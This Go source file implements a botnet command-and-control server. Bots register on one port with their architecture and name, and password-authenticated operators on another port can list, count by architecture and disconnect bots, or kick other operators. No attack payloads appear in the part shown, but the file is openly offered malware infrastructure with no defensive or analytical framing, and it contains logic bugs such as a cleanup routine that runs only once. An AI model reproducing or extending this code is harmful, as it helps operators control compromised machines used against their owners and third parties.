package main

import (
	"fmt"
	"net"
	"strings"
)


func (cnc *CNC) worker(bot *Bot) {
	defer bot.conn.Close()

	var buffer [1024]byte
	n, err := bot.conn.Read(buffer[0:])
	if err != nil { fmt.Println(err) }

	arch := strings.TrimSpace(string(buffer[0:n]))
	bot.arch = arch


	n, err = bot.conn.Read(buffer[0:])
	if err != nil { fmt.Println(err) }

	name := strings.TrimSpace(string(buffer[0:n]))
	bot.name = name


	cnc.Bots = append(cnc.Bots, bot)


	for {
		var buffer [1024]byte
		n, err := bot.conn.Read(buffer[0:])
		if err != nil { fmt.Println(err); break }

		line := strings.TrimSpace(string(buffer[0:n]))

		if line == "exit" {
			break
		} else if line != "" {
			continue
		}
	}

	bot.alive = false
}

func (cnc *CNC) readline(client *Client) (string, error) {
	var buffer [1024]byte
	n, err := client.conn.Read(buffer[0:])

	if err != nil { fmt.Println(err); client.alive = false; return "", err }

	line := strings.TrimSpace(string(buffer[0:n]))
	return line, nil
}

func (cnc *CNC) write(line string, client *Client) {
	client.conn.Write([]byte(line))
}


func (cnc *CNC) command(client *Client, line string) {
	cmd 	:= strings.Split(line, " ")[0]
	args 	:= strings.Split(line, " ")[1:]

	if cmd == "bots" {
		bots := 0
		for _, bot := range cnc.Bots {
			if bot.alive {
				bots++
			}
		}

		cnc.write(fmt.Sprintf("Total Bots: %d\n=====\n", bots), client)

		arches := make(map[string]int)

		for _, bot := range cnc.Bots {
			if bot.alive {
				cnc.write(fmt.Sprintf("%s\n", bot.name), client)
				arches[bot.arch]++
			}
		}

		cnc.write("\n=====\n", client)
		for arch, count := range arches {
			cnc.write(fmt.Sprintf("%s: %d\n", arch, count), client)
		}

	} else if cmd == "clients" {
		for _, cli := range cnc.Clients {
			if cli.alive {
				cnc.write(fmt.Sprintf("\r%s is connected\n", cli.username), client)
			}
		}

		cnc.write("\n", client)
	} else if cmd == "kill" {
		if len(args) != 1 {
			cnc.write("\rMissing Arguments\n\n", client)
			return
		}

		for _, bot := range cnc.Bots {
			if bot.name	== args[0] {
				bot.conn.Write([]byte("exit"))
				bot.conn.Close()
				bot.alive = false
				return
			}
		}

		cnc.write(fmt.Sprintf("\rCouldn't find bot \"%s\"\n\n", args[0]), client)
	} else if cmd == "kick" {
		if len(args) != 1 {
			cnc.write("\rMissing Arguments\n\n", client)
			return
		}

		username := args[0]

		if client.username == username {
			cnc.write("\rYou cant kick yourself\n\n", client)
		}

		for _, user := range cnc.Clients {
			if user.username == username {
				cnc.write(fmt.Sprintf("\rSuccessfully kicked %s\n\n", user.username), client)
				cnc.write(fmt.Sprintf("\r%s kicked you\n", client.username), user)
				user.alive = false
				user.conn.Close()
				return
			}
		}

		cnc.write(fmt.Sprintf("\rCouldn't find user \"%s\"\n\n", username), client)
	} else if cmd == "clear" {
		cnc.write("\033[2J\033[1;1H", client)
	} else {
		cnc.write("\rUnknown Command\n", client)
	}
}


func (cnc *CNC) connection(client *Client) {
	defer client.conn.Close()

	cnc.write("\rUsername: ", client)
	username, _ := cnc.readline(client)

	cnc.write("\rPassword: ", client)
	password, _ := cnc.readline(client)


	found := false
	for _, user := range cnc.Users {
		splitString := strings.Split(user, ":")
		splitUsername := splitString[0]
		splitPassword := splitString[1]

		if username == splitUsername  && password == splitPassword {
			found = true
			break
		}
	}

	if !found {
		cnc.write("\n\rInvalid Username or Password\n", client)
		client.alive = false
		client.conn.Close()
		return
	}
	client.username = username
	client.password = password
	cnc.Clients = append(cnc.Clients, client)




	cnc.write("\033[2J\033[1;1H", client)

	for {
		cnc.write("\n\r> ", client)
		line, err := cnc.readline(client)

		if err != nil { break }

		if line == "exit" || line == "quit" || line == ".q" {
			cnc.write("\rbye!\n\n", client)
			break
		}

		cnc.command(client, line)
		client.alive = false
	}
}


func (cnc *CNC) Start() {
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", cnc.Host, cnc.Port))
	if err != nil { fmt.Println(err) }


	go func() {
		for i, client := range cnc.Clients {
			if !client.alive {
				cnc.Clients = append(cnc.Clients[:i], cnc.Clients[i+1:]...)
			}
		}

		for i, bot := range cnc.Bots {
			if !bot.alive {
				cnc.Bots = append(cnc.Bots[:i], cnc.Bots[i+1:]...)
			}
		}
	}()

	go func() {
		ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", cnc.Host, cnc.BotPort))
		if err != nil { fmt.Println(err) }

		for {
			conn, err := ln.Accept()
			if err != nil { fmt.Println(err); break }

			bot := &Bot {
				name: "",
				conn: conn,
				alive: true,
			}

			go cnc.worker(bot)
		}
	}()

	for {
		conn, err := ln.Accept()

		if err != nil { fmt.Println(err) }

		client := &Client {
			conn: conn,
			addr: conn.RemoteAddr().String(),
			alive: true,
		}


		go cnc.connection(client)
	}
}
